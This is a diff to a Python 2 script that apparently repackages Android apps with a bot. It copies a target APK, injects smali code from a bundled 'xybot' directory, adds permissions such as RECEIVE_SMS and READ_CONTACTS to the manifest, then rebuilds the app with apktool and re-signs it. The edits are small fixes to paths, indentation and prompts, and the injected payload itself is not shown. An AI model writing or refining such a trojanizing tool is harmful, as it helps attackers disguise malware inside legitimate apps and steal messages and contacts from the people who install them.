@@ -54,6 +54,7 @@ while not os.path.isfile(origapp):
 if os.path.isdir(os.getcwd()+ "/../temp/")== False:
 	os.mkdir(os.getcwd()+ "/../temp/")
 
+
 	
 tmp = os.getcwd() + "/../temp"
 shutil.copy(origapp, tmp)
@@ -67,6 +68,7 @@ tmpfol = origapp.replace(' ', '')[:-4]
 print "Injecting Phase 1"
 print "******************"
 injct = os.getcwd() + "/../bin/xybot"
+
 neworigapp = os.getcwd() + "/" + tmpfol + "/smali/com/xybot"
 print "Original App location is set to be " + neworigapp
 print "********************************"
@@ -104,7 +106,7 @@ def inserting():
 
 		count2 = int(count)
 	
-		lines.append("0")
+#		lines.append("0")
 		for i in range(count2, count1 - 1, -1):
 			lines[i + 1] = lines[i]
 	
@@ -202,6 +204,7 @@ def styles(tep):
 ################################################################################################
 #                       Signing the APK File                                                   #
 ################################################################################################
+print os.getcwd()
 
 ApkToolPath = "../bin"
 def sign_apk(fn, fn_new):
@@ -219,12 +222,13 @@ def sign_apk(fn, fn_new):
 ################################################################################################
 
 def check(ttpt):
-	with open(MANIFEST) as f:  lines = f.read().splitlines()
-	for line in lines:
-		if line.find(ttpt) >= 0:
-			print line
-			return True
-	f.close()	
+	with open(MANIFEST) as f:  
+		lines = f.read().splitlines()
+		for line in lines:
+			if line.find(ttpt) >= 0:
+				print line
+				return True
+		f.close()	
 	return False
 	
 ################################################################################################
@@ -233,6 +237,7 @@ def check(ttpt):
 
 print "Trying to inject permission ! "
 print "***********************************************"
+
 if check("android.permission.RECEIVE_SMS"):
 	print "Permission 1 Exist"
 else:
@@ -263,6 +268,9 @@ if check("android.permission.READ_CONTACTS"):
 else:
 	print "Injecting Permission !"
 	permin("android.permission.READ_CONTACTS")
+
+
+
 print "***********************************************"
 print "Permissions injected successfully!! "
 
@@ -293,10 +301,13 @@ print "Successfull !"
 #                  Program Flows on Building the modified APK                                  #
 ################################################################################################
 
+dum = raw_input("Press Enter to start rebuilding APK...")
+
 print "Building the APK"
 print os.getcwd()
 print "***********************************************"
-os.system('../bin/apktool b ' + tmpfol + " ../Output/" + origapp)
+print os.getcwd()
+os.system('./../bin/apktool b ' + tmpfol + " ../Output/" + origapp)
 print "***********************************************"
 print "Success!"
 
@@ -306,7 +317,7 @@ print "Success!"
 
 print "Signing the APK"
 print "***********************************************"
-sign_apk("/Output/" + origapp, None)
+sign_apk("../Output/" + origapp, None)
 print "***********************************************"
 print "Success!"
 dum = raw_input("Press ENTER to continue")
